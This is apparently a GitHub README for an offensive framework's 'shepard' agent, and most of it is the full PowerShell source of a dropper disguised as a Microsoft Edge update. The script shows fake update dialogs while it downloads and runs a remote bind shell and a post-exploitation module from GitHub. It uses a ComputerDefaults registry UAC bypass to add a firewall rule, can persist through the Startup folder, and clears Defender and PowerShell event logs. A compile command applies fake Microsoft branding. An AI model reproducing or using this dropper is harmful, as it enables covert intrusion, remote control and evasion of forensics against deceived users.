## :octocat: sherpard ( BindTCPshell ) - [@venom](https://github.com/r00t-3xp10it/venom) Amsi Evasion Agent nº9

<br />

Author: @d3adzo ( BindShell ) | @r00t-3xp10it<br />
Tested Under: Windows 10 ( 19042 ) x64 bits<br />
Required Dependencies: <b><i>Invoke-WebRequest</i></b> {native} , <b><i>python3</i></b> {attacker machine}<br />
Optional Dependencies: <b><i>netsh advfirewall</i></b> {native} , <b><i>ComputerDefaults.exe</i></b> {native}<br />
Sherpard GitHub: https://github.com/d3adzo/shepard<br />

<br />

## :octocat: shepard - C2 droppers Description
This PS dropper later compiled to binary.exe uses <b><i>Social Engineering</i></b> to trick target user into beliving he is installing a MicrosoftEdge update<br />while in background downloads the <b><i>[BindTCPshell](https://github.com/d3adzo/shepard)</i></b> and <b><i>[redpill](https://github.com/r00t-3xp10it/redpill)</i></b> post-exploitation auxiliary module before adds a <b><i>[firewall rule](https://user-images.githubusercontent.com/23490060/121229553-04678c80-c886-11eb-8cfd-2f82a40c4e2b.png)</i></b> to prevent client execution TCP connection warnings. Then executes the BindTCPshell in a background process. ( The Client beacons home every 30 seconds )

![secupdate](https://user-images.githubusercontent.com/23490060/121434739-aca84e80-c975-11eb-9110-ca78a69c6f74.png)<br /><br />

<br /><br />

## :octocat: Dropper|Client Execution Diagram
![diagram](https://user-images.githubusercontent.com/23490060/121988665-a8739b00-cd92-11eb-803b-e4480356bf2a.png)

<br />

**Executing Dropper (target):** The Social Engineering binary accepts the use of parameters and arguments. Example:
```powershell
.\MEdgeUpdaterService.exe -OutFile "$env:TMP\Payload.exe" -PostExploit True -Firewall True -Persiste True
```
![def](https://user-images.githubusercontent.com/23490060/121764725-f348a500-cb3d-11eb-9790-408395318934.png)
  - [x] <b><i>Remark:</i></b>  If executed without any <b><i>-parameters 'arguments'</i></b>, then the dropper will use internal default settings to run.<br />
  - [x] <b><i>Remark:</i></b> The dropper will <b><i>'download\execute the Client in background'</i></b> without any terminal console beeing spawned to target user.<br />
  - [x]  <b><i>Remark:</i></b> ALL droppers will delete logfiles from '<b><i>windows powershell</i></b>', '<b><i>Defender\Operational</i></b>', etc. if they are executed with admin privileges.

<br />

<b><i>Executing Server (attacker):</i></b> to recive the connection back
```cmd
python3 shepardsbind_recv.py <target IP>
```
![um](https://user-images.githubusercontent.com/23490060/121764609-29d1f000-cb3d-11eb-94b0-a3fb0dffe36c.png)

<br />

<b><i>To access shell options</i></b> execute:
 ```powershell
 powershell -File redpill.ps1 -Help Parameters
```
![yap](https://user-images.githubusercontent.com/23490060/121259376-f0348700-c8a7-11eb-8734-5f0fa2742181.png)<br />

<br />

<b><i>To quit shepard C2 execute:</i></b>
```cmd
@shepard > quit
```
- [x] This action will stop <b><i>Client.exe</i></b> remote process by is <b><i>PID</i></b> number identifier!

<br /><br />

## :octocat:  Dropper files Parameters\Arguments syntax

|Parameter Name|Arguments|Description|Default Value|
|---|---|---|---|
|PostExploit|True, False|Downloads redpill.ps1 auxiliary module to target %tmp%|True|
|Firewall|True, False|creates Client.exe exception firewall rule on target system|False -> <b><i>'under UserLand privileges'</i></b> |
|OutFile|Path\Name.exe|Client.exe Name \ Upload destination on target system|$Env:TMP\edge_browser_updater.exe|
|Persiste|True, False|Copy Client.exe into target startup folder also|False|

<br /><br />

## :octocat: @venom v1.0.17 framework - shepard rat implementation

|Venom Option|Attack Vector|Action|
|---|---|---|
|MEdgeUpdaterService.exe|Dropper.exe (Microsoft Edge Update) URL LINK|download client + redpill.ps1 and add firewall rule<br />And spawns msgbox's to target user pretending to<br />be one MEdge update! (uses EOP to add firewall rule)|
|FirefoxUpdaterService.exe|Dropper.exe (Mozilla Firefox Update) URL LINK|download client + redpill.ps1 and add firewall rule<br />And spawns msgbox's to target user pretending to<br />be one Firefox update! (uses EOP to add firewall rule)|
|ChromeUpdaterService.exe|Dropper.exe (Google Chrome Update) URL LINK|download client + redpill.ps1 and add firewall rule<br />And spawns msgbox's to target user pretending to<br />be one Chrome update! (uses EOP to add firewall rule)|
|shepbind_serv.exe|Raw Client.exe rename\download URL LINK|If manually executed, connects back to the Server|

- [x] <b><i>Remark:</i></b> shepbind_serv.exe client does download <b><i>redpill.ps1</i></b> or add <b><i>firewall exception</i></b> rule. (it simple connects back to the Server)

<br /><br />

## :octocat: Proof-Of-Concept - MEdgeUpdaterService.exe Social Engineering Dropper

```powershell
<#
.SYNOPSIS
   Trigger sherpard (BindTCPshell) download\execution

   Author: @d3adzo (BindShell) | @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}
   Optional Dependencies: netsh advfirewall {native}
   PS cmdlet Dev version: v2.2.14

.DESCRIPTION
   This cmdlet uses Social Engineering to trick target user into beliving he
   is installing a Microsoft Edge update while in background downloads the
   BindTCPshell and redpill post-exploitation auxiliary and adds a firewall
   rule to prevent client execution TCP connection warnings. Then executes
   the BindTCPshell in a background process (beacons home every 30 seconds).

.NOTES
   Attacker needs to know target ip address to be abble to connect to bind shell
   This cmdlet will be transformed to binary.exe before beeing deliver to target!
   Select -Firewall 'True' if you wish to Force firewall rule under UserLand privs!
   The Social Engineering binary accepts the use of parameters and arguments example:
   PS C:\> .\MEdgeUpdaterService.exe -PostExploit False -Firewall True -Persiste True

.Parameter PostExploit
   Accepts arguments: True, False (default: True)

.Parameter Firewall
   Accepts arguments: True, False (default: False)

.Parameter Persiste
   Accepts arguments: True, False (default: False)

.Parameter OutFile
   The destination executable file name (default: $Env:TMP\edge_browser_updater.exe)

.EXAMPLE
   PS C:\> .\MEdgeUpdaterService.ps1
   automatic exploitation (default settings)

.EXAMPLE
   PS C:\> .\MEdgeUpdaterService.ps1 -OutFile "$Env:TMP\payload.exe"
   Automatic download\execute of payload.exe BindTCPshell on %tmp%

.EXAMPLE
   PS C:\> .\MEdgeUpdaterService.ps1 -OutFile "$Env:TMP\payload.exe" -Persiste True
   Automatic download\execute of payload.exe BindTCPshell on %tmp% and create startup entry!

.EXAMPLE
   PS C:\> .\MEdgeUpdaterService.ps1 -OutFile "$Env:TMP\payload.exe" -PostExploit True -Firewall True
   Download 'payload.exe' + add firewall rule + download redpill.ps1 and execute the BindTCPshell ..
   
.OUTPUTS
   ########################################################################
   #         * Enjoy a superior level of protection and control *         #
   # Microsoft Edge has built-in features designed to give you a superior #
   # level of control over your data and to protect your privacy online.  #
   ########################################################################

   Please wait, preparing microsoft edge for updates ..
   Connecting to MicrosoftEdge.Store on TCP 6006 SSL ..

   Name              : Microsoft.MicrosoftEdge
   Publisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
   Architecture      : Neutral
   ResourceId        :
   Version           : 44.19041.964.0
   PackageFullName   : Microsoft.MicrosoftEdge_44.19041.964.0_neutral__8wekyb3d8bbwe
   InstallLocation   : C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe
   IsFramework       : False
   PackageFamilyName : Microsoft.MicrosoftEdge_8wekyb3d8bbwe
   PublisherId       : 8wekyb3d8bbwe
   IsResourcePackage : False
   IsBundle          : False
   IsDevelopmentMode : False
   NonRemovable      : True
   IsPartiallyStaged : False
   SignatureKind     : System
   Status            : Ok
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$OutFile="$Env:TMP\edge_browser_updater.exe",
   [string]$PostExploit='True',
   [string]$Persiste="False",
   [string]$Firewall='False'
)


## Global variable declarations!
# Credits to website: https://ss64.com/ps/messagebox.html
Add-Type -AssemblyName PresentationCore,PresentationFramework
$ParseExePath = $OutFile.Split('\\')[-1]             ## edge_browser_updater.exe
$PayloadRPath = $OutFile -replace "$ParseExePath","" ## C:\Users\pedro\AppData\Local\Temp\
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
## Query medge binary for version number triggers defender, so .. (obfuscate it)!
$FoolAv = (Get-ItemProperty -Path "HKCU:SOFTWARE\AppDataLow\Software\Microsoft\Edge\IEToEdge" -EA SilentlyContinue).LastStubPath
If(-not($FoolAv) -or $FoolAv -eq $null)
{

   ## Make sure we have a version returned!
   $MEdgeVersion = "91.0.864.42" ## Latest version know!

}Else{## parsing medge version data!

   $RawObject = $FoolAv.Split('\\')
   $MEdgeVersion = $RawObject | Where-Object {
      $_ -iMatch '^(\d+.+\d+.+\d+.+\d+)$'
   }

}


## Aritemetic function that add's a number up to msedge
# installed version number, this way MEdgeUpdaterService
# version will be allways a number up to the installed version!
[int]$Somaart = $MEdgeVersion.split('.')[-1]         ## 41
$parseData = $MEdgeVersion -replace "$Somaart",""    ## 91.0.864.
$adiciona1 = $Somaart + 1                            ## 42
$MEdgeVersion = "$parseData"+"$adiciona1"            ## 91.0.864.42
$host.UI.RawUI.WindowTitle = "Microsoft Edge $MEdgeVersion Browser Update Service"


## Social Engineering MsgBox
$Result = [System.Windows.MessageBox]::Show("                                                Feature update                                                `n`nMicrosoft has released the latest Edge Stable Channel (version $MEdgeVersion)`nwhich incorporates the latest Security Updates of the Chromium project.`nCVE-2021-33741,CVE-2021-31937,CVE-2021-31982,CVE-2021-21224`n`nTHIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`n`n                            Install Microsoft Edge $MEdgeVersion Update?","                           Microsoft Edge Stable Channel $MEdgeVersion",1,0)
Write-Host "Please Wait, preparing microsoft edge for updates .." -ForegroundColor Green;Start-Sleep -Milliseconds 1400
Write-Host "Connecting to MicrosoftEdge.Store on TCP 6006 SSL .." -ForegroundColor DarkYellow -BackgroundColor Black


## Download Client BindShell
If(-not(Test-Path -Path "$OutFile" -EA SilentlyContinue))
{
   iwr -uri "https://github.com/d3adzo/shepard/releases/download/1.1/shepbind_serv.exe" -outfile "$OutFile" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
}

## Download redpill auxiliary
If($PostExploit -ieq "True")
{
   If(-not(Test-Path -Path "$Env:TMP\redpill.ps1" -EA SilentlyContinue))
   {
      ## Download redpill auxiliary!
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/redpill.ps1" -outfile "$Env:TMP\redpill.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
   }
}


If($IsClientAdmin -eq $False -and $Firewall -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create 'Client rat' firewall exception rule!

   .DESCRIPTION
      If sellected -Firewall 'True' and target system shell does NOT have
      administrator privileges then this function uses EOP to add the rule!
      Remark: This function spawn's a antivirus warning (no consequences).

   .NOTES
      Although EOP ComputerDefaults.exe is actually flagged by antivirus solutions.
      It is still very useful in situations where a registry key needs to be added\run quickly
      (create firewall exception rule). In this situation, even if the antivirus deletes the
      corresponding registry keys (it does), the command has already been successfully executed. 
   #>


   ## Shell running under 'UserLand' privileges!
   $Command = "netsh advfirewall firewall add rule name=`"$ParseExePath`" description=`"venom v1.0.17 - edge_browser_updater`" program=`"$OutFile`" dir=in action=allow protocol=TCP enable=yes"
   ## Adding to remote regedit the 'ComputerDefaults' hijacking keys (EOP - UAC Bypass - UserLand)
   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null
   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null
   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null
   Start-Process -WindowStyle hidden "$Env:WINDIR\System32\ComputerDefaults.exe" -Wait
   Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null

}ElseIf($IsClientAdmin -eq $True)
{

   ## Shell Running under Administrator privileges!
   netsh advfirewall firewall add rule name="$ParseExePath" description="venom v1.0.17 - edge_browser_updater" program="$OutFile" dir=in action=allow protocol=TCP enable=yes

}


## Execute bind tcp shell
Start-Sleep -Milliseconds 800
cd $PayloadRPath;&"$OutFile"


## Persistence function
If($Persiste -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Persiste 'Client rat' on startup folder!

   .NOTES
      This function copys -OUtFile "<file>" into target startup folder!
      And creates a new firewall exception rule pointing to startup folder
      if MEdgeUpdaterService.exe its executed with administrator privileges!
   #>


   $PersisteMe = "$Env:APPDATA\Microsoft\Windows\Start" + " Menu\Programs\Startup\$ParseExePath" -join ''
   If(Test-Path -Path "$OutFile" -ErrorAction SilentlyContinue)
   {
      Copy-Item -Path "$OutFile" -Destination "$PersisteMe" -Force|Out-Null
   }

   If($IsClientAdmin -eq $True)
   {
      netsh advfirewall firewall add rule name="$ParseExePath" description="venom v1.0.17 - edge_browser_updater" program="$PersisteMe" dir=in action=allow protocol=TCP enable=yes
   }

}


## Final Social Engineering! (MsgBox)
# credits: https://ss64.com/ps/messagebox.html
If(-not($MEdgeVersion) -or $MEdgeVersion -eq $null){$MEdgeVersion = "91.0.864.42"}
$Result = [System.Windows.MessageBox]::Show("Microsoft Edge Updated! - Version: $MEdgeVersion","Microsoft Edge Stable Channel $MEdgeVersion",0,64)


## Open browser in edge security bulletin page!
Start-Process msedge https://docs.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security


<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Delete eventvwr logfiles!

.NOTES
   This function Deletes ALL logs from eventvwr categories:
   'Windows Defender/Operational', 'PowerShell/Operational'
   'application' and 'Windows Powershell' categories if dropper
   MEdgeUpdaterService.exe is executed with Admin privileges!

#>

If($IsClientAdmin -eq $True)
{
   ## Delete eventvwr logfiles!
   wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
   wevtutil cl "Microsoft-Windows-PowerShell/Operational"
   wevtutil cl "Windows PowerShell"
   wevtutil cl "application"
}

exit
```

<br />

:octocat:  Compile <b><i>'MEdgeUpdaterService.ps1'</i></b> to <b><i>'MEdgeUpdaterService.exe'</i></b>
```powershell
.\ps2exe.ps1 -inputFile "MEdgeUpdaterService.ps1" -iconFile "edge_browser_icon.ico" -title "MEdge Updater Service" -version "91.0.864.42" -copyright "©Microsoft Corporation. All Rights Reserved." -product "Microsoft Edge Stable Channel" -noConsole -noOutput -noVisualStyles -noError
```

<br /><br />

:octocat: antiscan.me results of <b><i>'[shepbind_serv.exe](https://antiscan.me/scan/new/result?id=d66FHzYNSpHY)'</i></b>
![shepbind_serv](https://user-images.githubusercontent.com/23490060/122703331-3646fe80-d249-11eb-9364-e5260cd30864.png)
https://antiscan.me/scan/new/result?id=d66FHzYNSpHY
